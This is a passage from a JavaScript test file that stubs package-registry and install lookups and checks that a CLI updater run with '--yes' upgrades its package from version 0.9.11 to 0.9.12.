      viewDistTags: (pkg) => (pkg === CLI_PACKAGE ? { latest: '0.9.12' } : null),
      installed: new Map(),
      cliInstalled: '0.9.11',
      marketplacePin: () => ({ version: null }),
      managedInstall: () => null,
    });
    await run(['--yes']);

    expect(seams.specs).toStrictEqual([`${CLI_PACKAGE}@0.9.12`]);
  });
});
